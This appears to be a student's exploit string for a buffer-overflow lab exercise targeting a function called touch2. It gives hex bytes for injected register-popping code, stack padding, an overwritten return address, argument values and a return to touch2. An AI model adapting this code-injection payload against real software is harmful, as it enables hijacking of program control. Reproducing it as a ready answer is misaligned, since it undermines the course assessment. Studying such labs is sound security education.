/* Injected Code */
5f /* pop rdi */
5e /* pop rsi */
5a /* pop rdx */
c3 /* ret */
/* Padding */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
/* Return address: Injected Code */
c8 4b 66 55 00 00 00 00
/* Arguments */
39 28 93 1c 00 00 00 00 /* rdi */
00 29 93 1c 00 00 00 00 /* rsi */
72 27 93 1c 00 00 00 00 /* rdx */ 
/* Return address: touch2 */
f7 16 40 00 00 00 00 00
